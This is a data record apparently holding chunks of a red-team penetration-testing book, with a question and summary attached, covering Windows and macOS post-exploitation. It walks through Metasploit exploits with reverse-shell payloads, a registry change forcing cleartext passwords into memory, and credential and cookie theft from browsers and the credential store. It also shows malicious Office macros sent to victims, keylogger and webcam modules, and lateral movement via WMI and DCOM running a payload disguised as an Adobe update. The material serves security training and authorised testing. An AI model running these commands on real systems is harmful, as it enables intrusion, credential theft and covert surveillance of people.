and\n(https://github.com/FuzzySecurity/PSKernel-Primitives/tree/master/Sample-\nExploits/MS16-135), but how do we quickly identify what patches are installed\non a Windows system? We can use default commands on our victim system to\nsee what service packages are installed. Windows comes with a default\ncommand “systeminfo” that will pull all the patch history for any given\nWindows host. We can take that output, push it to our Kali system and run\nWindows Exploit Suggester to find known exploits against those vulnerabilities.\nBack on your Windows 10 Victims system:\nsysteminfo\nsysteminfo > windows.txt\nCopy windows.txt to your Kali box under optWindows-Exploit-\nSuggester\npython ./windows-exploit-suggester.py -i ./windows.txt -d 2018-03-\n21-mssb.xls\nThis tool hasn't been actively maintained in a little while, but you can easily add\nthe privilege escalation vulnerabilities you are looking for.\nIn cases where we are in a completely patched Windows environment, we focus\non different privilege escalation vulnerabilities in third party software or any 0-\nday/new vulnerabilities for the OS. For example, we are constantly looking for\nvulnerabilities like this, http://bit.ly/2HnX5id, which is a Privilege Escalation in\nWindows that looks like it is not patched at this time. Usually in these scenarios,\nthere might be some basic POC code, but it is up to us to test, validate, and many\ntimes finish the exploit. Some of the areas we regularly monitor for public\nprivilege escalations vulnerabilities:\nhttp://insecure.org/search.html?q=privilege%20escalation\nhttps://bugs.chromium.org/p/project-zero/issues/list?\ncan=1&q=escalation&colspec=ID+Type+Status+Priority+Milestone+Owner+Summary&cells=ids\nOften, it is just about timing. For example, when a vulnerability is discovered,\nthat may be your limited window of opportunity to further compromise the\nsystem before it is patched.\nPrivilege Escalation Lab\nThe best lab to test and try different privilege escalation vulnerabilities is\nMetasploitable3 (https://github.com/rapid7/metasploitable3) by Rapid7. This\nvulnerable framework automatically builds a Windows VM with all the common\nand some uncommon vulnerabilities. It does take a bit to set up, but once the\nVM is configured, it is a great testing lab.\nTo walk you through a quick example and to get you started:\nnmap the Metasploitable3 box (make sure to do all ports as you\nmight miss some)\nYou will see ManageEngine running on port 8383\nStart Up Metasploit and search for any ManageEngine vulnerabilities\nmsfconsole\nsearch manageengine\nuse\nexploit/windows/http/manageengine_connectionid_write\nset SSL True\nset RPORT 8383\nset RHOST <Your IP>\nexploit\ngetsystem\nYou will notice that you cannot get to system because the service\nyou compromised is not running as a privileged process. This is\nwhere you can try all different privilege escalation attacks.\nOne thing we do see is that Apache Tomcat is running as a privileged\nprocess. If we can abuse this service, we may be able to execute our\npayload as a higher service. We saw that Apache Tomcat was\nrunning on the outside on port 8282, but it needed a username and\npassword. Since we do have a userland shell, we can try to search\nfor that password on disk. This is where we can search the internet\nor Google \"Where are Tomcat Passwords Stored\". The result,\ntomcat-users.xml.\nOn the victim box, we can search and read the tomcat-users.xml file:\nshell\ncd \\ && dir /s tomcat-users.xml\ntype \"C:\\Program Files\\Apache Software\nFoundation\\tomcat\\apache-tomcat-8.0.33\\conf\\tomcat-\nusers.xml\nLet’s now attack Tomcat with the passwords we found. First, log\ninto the Tomcat management console on port 8282 and see that our\npassword worked. We can then use Metasploit to deploy a malicious\nWAR file via Tomcat.\nsearch tomcat\nuse exploit/multi/http/tomcat_mgr_upload\nshow options\nset HTTPusername sploit\nset HTTPpassword sploit\nset RPORT 8282\nset RHOST <Metasploitable3_IP>\nset Payload java/shell_reverse_tcp\nset LHOST <Your IP>\nexploit\nwhoami\nYou should now be System. We took advantage of a third party tool\nto privilege escalate to System.\nPulling Clear Text Credentials from Memory\nMimikatz (https://github.com/gentilkiwi/mimikatz) has been around for a while\nand changed the game in terms of getting passwords in clear text. Prior to\nWindows 10, running Mimikatz on a host system as a local administrator\nallowed an attacker to pull out clear text passwords from LSASS (Local Security\nAuthority Subsystem Service). This worked great until Windows 10 came along\nand made it inaccessible to read from, even as local admin. Now, there are some\nodd use cases I have seen where Single Sign-On (SSO) or some unique software\nputs the passwords back in LSASS for Mimikatz to read, but we will ignore this\nfor now. In this chapter, we are going to talk about what to do when it doesn't\nwork (like Windows 10).\nLet’s say you have compromised a Windows 10 workstation and privilege\nescalated to a local admin. By default, you would have spun up Mimikatz and,\nper the query below, see that the password fields are NULL.\nSo what can you do? The easiest option is to set the registry key to put the\npasswords back in LSASS. Within HKLM there is a UseLogonCredential\nsetting that if set to 0, will store credentials back in memory\n(http://bit.ly/2vhFBiZ):\nreg add\nHKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest\nv UseLogonCredential t REG_DWORD d 1 f\nIn Empire, we can run this via the shell command:\nshell reg add\nHKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest\nv UseLogonCredential t REG_DWORD d 1 f\nThe problem with this setting is that we will need the user to re-login to the\nsystem. You could cause a screen timeout, reboot, or logoff, so that you will be\nable to capture clear text credentials again. The easiest way though is to lock\ntheir workstation (so they don't lose any of their work . . . see how nice we\nare?). To trigger a lock screen:\nrundll32.exe user32.dll,LockWorkStation\nOnce we cause the lock screen and have them re-log back in, we can re-run\nMimikatz with clear text passwords.\nWhat if we can't get to a local administrative account? What are some other\noptions we have to get a user's credentials? Back in the day, a common\npentesting attack was to look in userland memory at thick clients to see if\ncredentials were stored in clear text. Now that everything is browser based, can\nwe do the same in the browser?\nThis is where putterpanda put a cool POC style tool together to accomplish just\nthis, called Mimikittenz (https://github.com/putterpanda/mimikittenz). What\nMimikittenz does is it utilizes the Windows function ReadProcessMemory() in\norder to extract plain-text passwords from various target processes such as\nbrowsers.\nMimikittenz has a great deal of memory search queries preloaded for Gmail,\nOffice365, Outlook Web, Jira, Github, Bugzilla, Zendesk, Cpanel, Dropbox,\nMicrosoft OneDrive, AWS Web Services, Slack, Twitter, and Facebook. It is\nalso easy to write your search expressions within Mimikittenz.\nThe best part of this tool is that it does not require local administrative access as\nit is all userland memory. Once we have compromised a host, we will import\nMimikittenz into memory, and run the Invoke-mimikittenz script.\nAs seen above, the user had Firefox logged into Github and we were able to pull\ntheir username and password from the browser's memory. Now, I hope\neveryone can take this tool to the next level and create more search queries for\ndifferent applications.\nGetting Passwords from the Windows Credential Store and\nBrowsers\nThe Windows Credential Store is a default feature of Windows that saves\nusernames, passwords, and certificates for systems, websites, and servers. When\nyou have authenticated into a website using Microsoft IE/Edge, you normally get\na pop-up that asks \"do you want to save your password?\" The Credential Store\nis where that information is stored. Within the Credential Manager, there are\ntwo types of credentials: Web and Windows. Do you remember which user has\naccess to this data? It is not system, but the user who is logged in who can\nretrieve this information. This is great for us, as with any phish or code\nexecution, we are usually in rights of that person. The best part is that we don't\neven need to be a local administrator to pull this data.\nHow can we pull this information? There are two different PowerShell scripts\nwe can import to gather this data:\nGathering Web Credentials:\nhttps://github.com/samratashok/nishang/blob/master/Gather/Get-\nWebCredentials.ps1\nGathering Windows Credentials (Only does type Generic not\nDomain):\nhttps://github.com/peewpw/Invoke-\nWCMDump/blob/master/Invoke-WCMDump.ps1\nAs you can see from the dump, we pulled both their Facebook-stored credential\nand any generic credentials they have. Remember, for the web credentials, Get-\nWebCredentials will only get passwords from Internet Explorer/Edge. If we\nneed to get it from Chrome, we can use the Empire payload\npowershell/collection/ChromeDump. Prior to getting ChromeDump to work,\nyou will first need to kill the Chrome process and then run ChromeDump.\nLastly, I love to pull all browser history and cookies. Not only can we learn a\ngreat deal about their internal servers, but also, if their sessions are still alive, we\ncan use their cookies and authenticate without ever knowing their passwords!\nUsing a PowerShell script like: https://github.com/sekirkity/BrowserGather, we\ncan extract all the Browser Cookies, steal them, and tunnel our browser to take\nadvantage of these cookies, all without privilege escalating.\nNext, we can even start looking for servers and credentials in all the third party\nsoftware that might be installed on the victim's system. A tool called\nSessionGopher (https://github.com/fireeye/SessionGopher) can grab hostnames\nand saved passwords from WinSCP, PuTTY, SuperPuTTY, FileZilla, and\nMicrosoft Remote Desktop. One of the other included features also included is\nthe ability to remotely grab local credentials off other systems on the network.\nThe easiest way to launch SessionGopher is to import the PowerShell script and\nexecute using:\nLoad PowerShell File:\n. .\\SessionGopher.ps1\nExecute SessionGopher\nInvoke-SessionGopher -Thorough\nThese are just a few ways we can get credentials from the host system without\never privilege escalating, bypassing UAC, or turning on a keylogger. Since we\nare in context of the user, we have access to many of the resources on the host\nmachine to help us continue our path to exploitation.\nGetting Local Creds and Information from OSX\nMost of the lateral movement within the THP focuses on Windows. This is\nbecause almost all of the medium to large environments utilize Active Directory\nto manage their systems and hosts. We do come across Macs more and more\neach year and want to make sure to include them as well. Once inside an\nenvironment, many of the attacks are similar to those in the Window's world (i.e.\nscanning for default creds, Jenkin/Application attacks, sniffing the network, and\nlaterally moving via SSH or VNC).\nThere are a few payloads that support Macs and one of my favorites is using\nEmpire. Empire can generate multiple payloads to trick your victim into\nexecuting our agents. These include ducky scripts, applications, Office macros,\nSafari launchers, pkgs, and more. For example, we can create an Office Macro\nsimilar to what we have done in Windows in PowerShell Empire:\n1. Launch Empire\n2. First, make sure to set up your Empire Listener as we did at the\nbeginning of the book\n3. Next, we need to build an OSX Macro payload\n1. usestager osx/macro\n4. Set an OutFile to write to your local file system\n1. set OutFile tmpmac.py\n5. Generate the Payload\nIf you take a look at the generated Office macro, you will see that it is just\nBase64 code that is executed by Python. Luckily for us, Python is a default\napplication on Macs and when this Macro is executed, we should get our agent\nbeacon.\nTo create the malicious Excel file in Mac, we can open a new Excel worksheet,\nGo to Tools, View Macros, Create a Macro in This Workbook, and once\nMicrosoft Visual Basic opens up, delete all current code and replace it with all\nyour new Macro code. Finally, save it as an xlsm file.\nNow, send off your Malicious file to your victim and watch the Empire agents\nroll in. On the victim side, once they open the Excel file, it will look something\nlike this:\nMake sure you create a reasonable story to have them click Enable Macros.\nOnce your agent connects back to your Empire server, the reconnaissance phase\nit pretty similar. We are going to need to:\nDump Brower information and passwords: usemodule\ncollection/osx/browser_dump\nEnable a Keylogger: usemodule collection/osx/keylogger\nCause an App prompt for password capture: usemodule\ncollection/osx/prompt\nAlways helps to use their camera to take a picture: usemodule\ncollection/osx/webcam\nLiving Off of the Land in a Windows Domain\nEnvironment\nAgain, in our examples below, we are going to be using PowerShell Empire.\nHowever, you can also use Metasploit, Cobalt Strike, or similar to do the same\nstyle attacks. It doesn't really matter as long as you have the ability to import\nPowerShell scripts into memory and evade whatever the host system protections\nare.\nNow that you have compromised your victim, stolen all the secrets from their\nworkstation, learned about some of the sites your victim browses, and run some\nnetstat style recon… what's next?\nFor a Red Teamer, it is really about finding reliable information on servers,\nworkstations, users, services, and about their Active Directory environment. In\nmany cases, we can't run any vulnerability scans or even an nmap scan due to the\nrisk of getting alerted/caught. So, how can we utilize \"features\" of the networks\nand services to find all the information we need?\nService Principal Names\nService Principal Names, or SPN, is a feature in Windows that allows a client to\nuniquely identify the instance of a service. SPNs are used by Kerberos\nauthentication to associate a service instance with a service logon account\n[https://msdn.microsoft.com/en-us/library/ms677949(v=vs.85).aspx]. For\nexample, you might have an SPN for service accounts that run MSSQL servers,\nHTTP servers, print servers, and others. For an attacker, querying SPN is a vital\npart of the enumeration phase. This is because any domain user account can\nquery AD for all the service accounts/servers that are associated with Active\nDirectory. We can identify all the databases and web servers without having to\nscan a single host!\nAs an attacker, we can take advantage of these \"features\" to query Active\nDirectory. From any domain-joined computer, an attacker can run the setspn.exe\nfile to query AD. This file is a default Windows binary and is on all modern\nWindows systems.\nsetspn -T [DOMAIN] -F -Q /\nSwitches:\n-T = Perform query on the specified domain\n-F = Perform queries at the AD forest, rather than domain\nlevel\n-Q = execute on each target domain or forest\n/ = Everything\nWhat type of information do we see from setspn? Below, running the setspn\ncommand, we see information about the services running on the domain\ncontroller, information about a workstation, and we also found a server named\nCSK-GITHUB. In this example, we can see that there is an HTTP service\nrunning on that host machine. If this had been on a different port, but still the\nsame protocol, that information would have been listed as well.\nSetspn will not only provide useful information about service users and all the\nhostnames in AD, but it will also tell us which services are running on the\nsystems and even the port. Why do we need to scan the network if we can get\nmost of the information directly from AD for services and even ports? What are\nsome of the things that you might attack right away? Jenkins? Tomcat?\nColdFusion?\nQuerying Active Directory\nI don't know how many times I have found a single domain user account and\npassword, only to be told by IT that it is just a domain user account with no other\nprivileges and not to worry. We have found these types of accounts on printers,\nshared kiosk workstations, flat file texts with passwords for services,\nconfigurations files, iPads, web apps that have the passwords within the source\nof the page, and so much more. But what can you do with a basic domain user\naccount with no other group memberships?\nGet More Detailed Information About Users in AD\nWe can use a tool called PowerView (http://bit.ly/2JKTg5d) created by\n@harmj0y to do all the dirty work for us. PowerView is a PowerShell tool to\ngain network situational awareness on Windows domains. It contains a set of\npure-PowerShell replacements for various Windows \"net *\" commands, which\nutilizes PowerShell AD hooks and underlying Win32 API functions to perform\nuseful Windows domain functionality [http://bit.ly/2r9lYnH]. As an attacker, we\ncan leverage PowerView and PowerShell to query AD, which can be done with\nthe lowest permissioned user in AD, \"Domain Users\", and even without local\nadministrator permissions.\nLet's walk through an example of how much data we can get with this low-level\nuser. To get started, we already have Empire running (you could replicate this in\nMetasploit, Cobalt Strike, or similar) and executed a payload on our victim\nsystem. If you have never set up Empire before, check out The Setup chapter on\nsetting up Empire and Empire payloads. Once we have our agent\ncommunicating with our Command and Control server, we can type \"info\" to\nfind out information about our victim. In this case, we have compromised a host\nrunning a fully patched Windows 10 system, with a username of neil.pawstrong,\non the cyberspacekitten's domain.\nNext, we want to query information from the domain without raising too much\nsuspicion. We can use the PowerView tools within Empire to get information.\nPowerView queries the Domain Controller (DC) to get information on users,\ngroups, computers, and more. The PowerView features that we will be using\nwill only query the Domain Controller and should look like normal traffic.\nWhat modules are available under Empire for situational awareness?\nWe can start with the PowerView script called get_user. Get_user queries\ninformation for a given user or users in the specified domain. By using the\ndefault settings, we can get a dump of all information about users in AD and\nassociated information.\nModule: situational_awareness/network/powerview/get_user\nIn the dump above, we can see information on one of the users, Purri Gagarin.\nWhat type of information did we get? We can see their samaccountname or\nusername, when their password was changed, what their object category is, what\nmembersof they are part of, last login, and more. With this basic user dump, we\ncan get significant amount of information from the directory service. What other\ntype of information can we get?\nModule: situational_awareness/network/powerview/get_group_member\nGet_group_member returns the members of a given group, with the option to\n\"Recurse\" to find all effective group members. We can use AD to find specific\nusers of certain groups. For example, with the following Empire settings, we\ncan search for all Domain Admins and groups that are part of the Domain Admin\ngroup:\ninfo\nset Identity \"Domain Admins\"\nset Recurse True\nset FullData True\nexecute\nNow, we have a list of users, groups, servers and services. This will help us map\nwhich users have which privileges. However, we still need detailed information\nabout workstations and systems. This could include versions, creation dates,\nusage, hostnames, and more. We can get this information on a module called\nget_computer.\nModule: situational_awareness/network/powerview/get_computer\nDescription: The get_computer module queries the domain for current computer\nobjects.\nWhat information do we gain from having get_computer querying the Domain\nController? Well, we see that we gained information about the machine, when it\nwas created, DNS hostnames, the distinguished names, and more. As an\nattacker, one of the most helpful recon details is obtaining operating system\ntypes and operating system versions. In this case, we can see that these systems\nare on Windows 10 and on Build 16299. We can take this information and find\nout how recent the OS is and if they are being actively patched on Microsoft's\nrelease info page: https://technet.microsoft.com/en-us/windows/release-\ninfo.aspx.\nBloodhound/Sharphound\nHow can we take all the information we gathered from our reconnaissance phase\nto create a path of exploitation? How can we easily and quickly correlate who\nhas access to what? Back in the day, we used to just try and compromise\neverything to get to where we want, but that always increased the likelihood of\ngetting caught.\nAndrew Robbins, Rohan Vazarkar, and Will Schroeder have created one of the\nbest tools for correlation called Bloodhound/Sharphound. Per their Github page,\n\"BloodHound uses graph theory to reveal the hidden and often unintended\nrelationships within an Active Directory environment. Attackers can use\nBloodHound to easily identify highly complex attack paths that would otherwise\nbe impossible to quickly identify. Defenders can use BloodHound to identify and\neliminate those same attack paths. Both blue and red teams can use BloodHound\nto easily gain a deeper understanding of privilege relationships in an Active\nDirectory environment.” [https://github.com/BloodHoundAD/BloodHound]\nBloodhound works by running an Ingestor on a victim system, and then queries\nAD (similar to what we previously did manually) for users, groups, and hosts.\nThe Ingestor will then try to connect to each system to enumerate logged in\nusers, sessions, and permissions. Of course, this is going to be pretty loud on the\nnetwork. For a medium-large sized organization on the default setting (which\ncan be modified), it can take less than 10 minutes to connect to every host\nsystem and query information using Sharphound. Note, since this touches every\ndomain-joined system on the network, it could get you caught. There is a Stealth\noption in Bloodhound that will only query Active Directory and not connect to\nevery host system, but the output is pretty limited.\nThere are currently two different versions (of which I'm sure the old one will\nsoon be removed):\nInside Empire, you can use the module:\nusemodule situational_awareness/network/bloodhound\nThis still uses the old PowerShell version that is very slow\nThe better option is Sharphound. Sharphound is the C# version of\nthe original Bloodhound Ingester. This one is much faster and\nstable. This can be used as a stand-alone binary or imported as a\nPowerShell script. The Sharphound PowerShell script will use\nreflection and assembly.load to load the compiled BloodHound C#\ningestor into memory.\nhttps://github.com/BloodHoundAD/BloodHound/tree/master/Ingestors\nTo run the Bloodhound/Sharphound Ingestor, there are multiple\nCollectionMethods you might need to specify:\nGroup - Collect group membership information\nLocalGroup - Collect local admin information for computers\nSession - Collect session information for computers\nSessionLoop - Continuously collect session information until killed\nTrusts - Enumerate domain trust data\nACL - Collect ACL (Access Control List) data\nComputerOnly - Collects Local Admin and Session data\nGPOLocalGroup - Collects Local Admin information using GPO\n(Group Policy Objects)\nLoggedOn - Collects session information using privileged methods\n(needs admin!)\nObjectProps - Collects node property information for users and\ncomputers\nDefault - Collects Group Membership, Local Admin, Sessions, and\nDomain Trusts\nTo run Blood/Sharphound, on the host system:\nRun PowerShell and then either import Bloodhound.ps1 or\nSharpHound.ps1:\nInvoke-Bloodhound -CollectionMethod Default\nInvoke-Bloodhound -CollectionMethod\nACL,ObjectProps,Default -CompressData -RemoveCSV -\nNoSaveCache\nRun the Executables:\nSharpHound.exe -c\nDefault,ACL,Session,LoggedOn,Trusts,Group\nOnce Bloundhound/Sharphound is finished, four files will be dropped onto the\nvictim system. Grab those files and move them onto your Kali box. Next, we\nneed to start our Neo4j server and import this data to build our correlation\ngraphs.\nStart Bloodhound\n1. apt-get install bloodhound\n2. neo4j console\n3. Open Browser to http://localhost:7474\n1. Connect to bolt://localhost:7687\n2. Username: neo4j\n3. Password: neo4j\n4. Change Password\n4. Run Bloodhound at a Terminal:\n1. bloodhound\n2. Database URL: bolt://127.0.0.1:7687\n3. Username: neo4j\n4. Password: New Password\n5. Load Data:\n1. On the right hand side, there is an \"Upload Data\" button\n2. Upload acls.csv, group_membership.csv, local_admin.csv,\nand sessions.csv\nIf you don't have a domain to test this on, I have uploaded the four Bloodhound\nfiles here: https://github.com/cyberspacekittens/bloodhound, so that you can\nrepeat the exercises. Once inside Bloodhound and all the data is imported, we\ncan go to the Queries to look at the \"Find Shorted Paths to Domain Admin\".\nWe can also pick specific users and see if we can map a path to that specific user\nor group. In our case, the first box we compromised is\nNEIL.PAWSTRONG@CYBERSPACEKITTENS.LOCAL. In the search bar,\nwe insert that user, click the \"Pathfinding\" button, and type \"Domain Admin\" (or\nany other user) to see if we can route a path between these objects.\nAs you can see from Neil's machine, we can pivot all the way to the CSK-Lab.\nOnce on the lab box, there is a user called Purri, who is a member of the\nHelpDesk group.\nIf we can compromise the Helpdesk group, we can pivot to Chris' system, who\nalso has Elon Muskkat currently logged in. If we can migrate to his process or\nsteal his clear text password, we can elevate to Domain Admin!\nFrom large networks, we have noticed limitations and searching issues with the\nBloodhound queries. One great benefit of using Neo4j is that it allows for raw\nqueries through its own language called Cypher. An in-depth look into Cypher\nfor custom queries can be found here:\nhttps://blog.cptjesus.com/posts/introtocypher.\nWhat kind of custom queries can we add? Well, @porterhau5 has made some\ngreat progress in extending Bloodhound to track and visualize your\ncompromises. Check out their article here:\nhttps://porterhau5.com/blog/extending-bloodhound-track-and-visualize-your-\ncompromise/.\nFrom a high level, @porterhau5 added the idea of tagging compromised hosts to\nhelp facilitate better pivoting through the environment. For example, in this fake\nscenario, we compromised the initial user by phishing the user niel.pawstrong.\nUsing the Cypher language and Raw Query feature on the Bloodhound app, we\ncan run these queries:\nAdding an Owned Tag to a Compromised System:\nMATCH (n) WHERE\nn.name=\"NEIL.PAWSTRONG@CYBERSPACEKITTENS.LOCAL\"\nSET n.owned=\"phish\", n.wave=1\nRunning a Query to show all owned systems that were phished\nMATCH (n) WHERE n.owned=\"phish\" RETURN n\nNow, we can add some custom queries to Bloodhound. On the Queries tab of\nBloodhound, scroll to the bottom and click the edit button next to \"Custom\nQueries\". Replace all the text with the contents from:\nhttps://github.com/porterhau5/BloodHound-\nOwned/blob/master/customqueries.json\nAfter we save, we should have many more queries created. We can now click\non \"Find Shortest Path from owned node to Domain Admin\".\nIf you want to look into this more closely, check out @porterhau5's forked\nversion of Bloodhound. It makes tagging compromised machines much prettier\nand allows for more custom functionality:\nhttps://github.com/porterhau5/BloodHound-Owned.\nSo far, without scanning, we have been able to gain a great deal of information\nabout the organization. This is all with rights as the local AD user (domain\nusers) and for the most part, none of the network traffic looks too suspicious. As\nyou can see, we were able to do all this without being a local administrator or\nhaving any administrative rights on the local system.\nAdvanced ACL/ACE Bloodhound\nWhen using Bloodhound's Collection Method Access Control List (ACL) type,\nour script will query AD to gather all the access control permissions on\nusers/objects. The information we gather from Access Control Entries (ACEs)\ndescribes the allowed and denied permissions for users, groups, and computers.\nFinding and abusing ACEs can be an entire book on its own, but here are a\ncouple of good starting resources:\nBloodHound 1.3 – The ACL Attack Path Update\nhttps://wald0.com/?p=112\nIntroducing the Adversary Resilience Methodology\nhttp://bit.ly/2GYU7S7\nWhat are we looking for when importing ACL data into Bloodhound?\nBloodhound identifies areas where weaknesses might exist in ACEs. This will\ninclude who has the ability to change/reset passwords, add members to groups,\nupdate objects like the scriptPath for other users, update object or write a new\nACE on an object, and more.\nHow might you use this? When compromising boxes and gaining additional\ncredentials, we can target paths to find a user that has the ability to reset\npasswords or modify ACE permissions. This will lead to creative ways to find\npaths to Domain Admin or privileged accounts, and even allow for setting up\nbackdoors to be used later. A great resource to learn more about these types of\nabuses is: Robbins-An-ACE-Up-The-Sleeve-Designing-Active-Directory-\nDACL-Backdoors presentation (http://ubm.io/2GI5EAq).\nMoving Laterally - Migrating Processes\nOnce on a box with multiple users, it is common practice to either make tokens\nor migrate tokens of different users. This is nothing new, but heavily used to\nmove laterally within an environment. Usually from Bloodhound outputs or\nshared workstations, as attackers, we need to be able to impersonate other users\non our victim systems.\nThere are different ways to accomplish this using many of the tools we have. In\nterms of Metasploit, we should all be pretty familiar with the Post Exploitation\nincognito (https://www.offensive-security.com/metasploit-unleashed/fun-\nincognito/) to steal tokens. In Empire, we can use steal_tokens to impersonate a\nuser on that system. I have noticed that sometimes stealing tokens can break our\nshells. To avoid this, we can inject a new agent into a running process owned by\na different user.\nIn the following image, we phished an employee who ran our malware. This\nallowed us to run in a process owned by that victim user (neil.pawstrong). Once\non that user's box, we pivoted to Buzz Clawdrin's system and spawned a new\nagent with WMI (Windows Management Instrumentation). The issue here is\nthat we are still under the process of our initial victim, neil.pawstrong, as we\nused our cached credentials to spawn a shell onto Buzz's host. Therefore,\ninstead of stealing tokens, we should use Empire's psinject feature.\nPSInject in Empire \"has the ability to inject an agent into another process using\nReflectivePick to load up the .NET common language runtime into a process and\nexecute a particular PowerShell command, all without starting a new\npowershell.exe process!” [http://bit.ly/2HDxj6x] We use this to spawn a brand\nnew agent running as a process owned by Buzz.Clawdrin, so that we can now\nget his access permissions.",
    "question": "What are the key methods and tools used to gain and maintain access to a Windows domain environment without requiring local administrative privileges?",
    "summary": "The text explains how to use CrackMapExec (CME) with Empire to scan networks and gain access to systems using compromised credentials. It also covers methods for privilege escalation, such as exploiting unquoted service paths and using tools like PowerUp and Mimikatz to extract clear text passwords. Additionally, it discusses how to gather credentials from Windows and macOS systems, and how to use Bloodhound and Neo4j for advanced Active Directory reconnaissance and mapping of privilege paths."
  },
  {
    "start": 67,
    "end": 76,
    "text": "Moving Laterally Off Your Initial Host\nNow that you have found potential routes to move to, what are the options to\ngain code execution to those systems? The most basic way is to use the\npermission of our current Active Directory user to gain control of another\nsystem. For example, we might see a manager who has full access to their\nsubordinates’ machines, a conference/lab machine with multiple users who have\nadministrative privileges, a misconfiguration on internal systems, or see that\nsomeone manually added a user to the local admin group on that PC. These are\nsome of the ways we see a user have remote access to other workstations on the\nnetwork. Once on a compromised machine, we can either take the results from\nBloodhound or rescan the network to see what machines we have local access\non:\nEmpire Module:\nsituational_awareness/network/powerview/find_localadmin_access\nMetasploit Module: http://bit.ly/2JJ7ILb\nEmpire's find_localadmin_access will query Active Directory for all hostnames\nand try to connect to them. This is definitely a loud tool as it needs to connect to\nevery host and validate if it is a local administrator.\nAs we can see, the find_localadmin_access module identified that our\ncompromised user does have access to the buzz.cyberspacekittens.local\nmachine. This should be the same as when we ran Bloodhound. To double\ncheck that we have access, I generally do non-interactive remote commands like\ndir \\\\[remote system]\\C$ and see that we have read/write permission to the C\ndrive.\nIn terms of lateral movement, there are several options to choose from. Let's\nfirst take a peek at the ones in Empire as they are generally the most common\n(pulled straight from Empire):\ninveigh_relay: Inveigh's SMB relay function. This module can be\nused to relay incoming HTTP/Proxy NTLMv1/NTLMv2\nauthentication requests to an SMB target. If the authentication is\nsuccessfully relayed and the account has the correct privilege, a\nspecified command or Empire launcher will be executed on the target\nPSExec style.\ninvoke_executemsbuild: This function executes a powershell\ncommand on a local/remote host using MSBuild and an inline task. If\ncredentials are provided, the default administrative share is mounted\nlocally. This command will be executed in the context of the\nMSBuild.exe process without starting PowerShell.exe.\ninvoke_psremoting: Executes a stager on remote hosts using\nPSRemoting. As long as the victim has psremoting enabled (not\nalways available), we can execute a PowerShell via this service.\ninvoke_sqloscmd: Executes a command or stager on remote hosts\nusing xp_cmdshell. Good ol' xp_cmdshell is back!\ninvoke_wmi: Executes a stager on remote hosts using WMI. WMI is\nalmost always enabled and this is a great way to execute your\nPowerShell payloads.\njenkins_script_console: Deploys an Empire agent to a windows\nJenkins server with unauthenticated access to script console. As we\nknow, Jenkins servers are commonly seen and without credentials\nusually means full RCE through the /script endpoint.\ninvoke_dcom: Invoke commands on remote hosts via\nMMC20.Application COM object over DCOM\n(http://bit.ly/2qxq49L). Allows us to pivot without psexec, WMI or\nPSRemoting.\ninvoke_psexec: Executes a stager on remote hosts using PsExec type\nfunctionality. This is the old school way using PsExec to move our\nfile and execute. This could potentially set off alarms, but still a\ngood method if there is nothing else available.\ninvoke_smbexec: Executes a stager on remote hosts using\nSMBExec.ps. Instead of using PsExec, we can do a similar attack\nwith samba tools.\ninvoke_sshcommand: Executes a command on a remote host via\nSSH.\ninvoke_wmi_debugger: Uses WMI to set the debugger for a target\nbinary on a remote machine to be cmd.exe or a stager. Using\nDebugger tools like sethc (sticky keys) to execute our agents.\nnew_gpo_immediate_task: Builds an 'Immediate' schtask to push out\nthrough a specified GPO. If your user account has access to modify\nGPOs, module lets you push out an ‘immediate’ scheduled task to a\nGPO that you can edit, allowing for code execution on systems\nwhere the GPO is applied.\n[http://www.harmj0y.net/blog/empire/empire-1-5/]\nThese are just some of the easiest and most common techniques to move\nlaterally. Later in the book, we will discuss some of the lesser common\ntechniques to get around the network. On most networks, Windows\nManagement Instrumentation (WMI) is generally enabled as it is required for\nmanagement of workstations. Therefore we can use invoke_wmi to move\nlaterally. Since we are using cached credentials and our account has access to\nthe remote host, we don't need to know the user's credentials.\nExecute on Remote System\nusemodule lateral_movement/invoke_wmi\nSet the Computer you are going to attack:\nset ComputerName buzz.cyberspacekittens.local\nDefine which Listener to use:\nset Listener http\nRemotely connect to that host and execute your malware:\nexecute\nInteract with the New Agent\nagents\ninteract <Agent Name>\nsysinfo\nLateral Movement with DCOM\nThere are a number of ways to move laterally once on a host. If the\ncompromised account has access or you are able to create tokens with captured\ncredentials, we can spawn different shells using WMI, PowerShell Remoting, or\nPSExec. What if those methods are being monitored? There are some cool\nWindows features that we can take advantage of by using the Distributed\nComponent Object Model (DCOM). DCOM is a Windows feature for\ncommunicating between software components on different remote computers.\nYou can list all of a machine’s DCOM applications using the PowerShell\ncommand: Get-CimInstance Win32_DCOMApplication\nPer @enigma0x3's research (https://enigma0x3.net/2017/01/23/lateral-\nmovement-via-dcom-round-2/), he identified that there are multiple objects (for\nexample, ShellBrowserWindow and ShellWindows) that allows the remote\nexecution of code on a victim host. When listing all the DCOM applications (as\nseen as above), you will come across a ShellBrowserWindow object with a\nCLSID of C08AFD90-F2A1-11D1-8455-00A0C91F3880. With that object\nidentified, we can abuse this feature to execute binaries on a remote workstation\nas long as our account has access:\npowershell\n$([activator]::CreateInstance([type]::GetTypeFromCLSID(\"C08AFD90-\nF2A1-11D1-8455-\n00A0C91F3880\",\"buzz.cyberspacekittens.local\"))).Navigate(\"c:\\windows\\system32\\calc.exe\")\nThis will only execute files locally on the system and we cannot include any\ncommand line parameters to the executable (so no cmd /k style attacks). Instead,\nwe can call files from remote systems and execute them, but note that the user\nwill get a pop-up warning. In this case, I am currently on a victim's host\nneil.cyberspacekittens.local that has administrative access to a remote\nworkstation called buzz. We are going to share one folder on neil's workstation\nand host our malicious payload. Next, we can call the DCOM object to execute\nour hosted file on the remote victim's (buzz) machine.\n$([activator]::CreateInstance([type]::GetTypeFromCLSID(\"C08AFD90-F2A1-\n11D1-8455-\n00A0C91F3880\",\"buzz.cyberspacekittens.local\"))).Navigate(\"\\\\neil.cyberspacekittens.local\\Public\\adobeupdate.exe\")\nAs you can see in the next image, a pop-up was presented on Buzz's machine\nabout running an adobeupdate.exe file. Although most users would click and\nrun this, it might get us caught.\nSo, the better route to take to avoid this issue would be to move the file over\n(something like mounting the victim's drive) prior to using DCOM to execute\nthat file. @enigma0x3 took this even further and abused DCOM with Excel\nMacros. First, we would need to create our malicious Excel document on our\nown system and then use the PowerShell script (https://bit.ly/2pzJ9GX) to\nexecute this .xls file on the victim host.\nOne thing to note is that there are a multitude of other DCOM objects that can\nget information from systems, potentially start/stop services and more. These\nwill definitely provide great starting points for additional research on 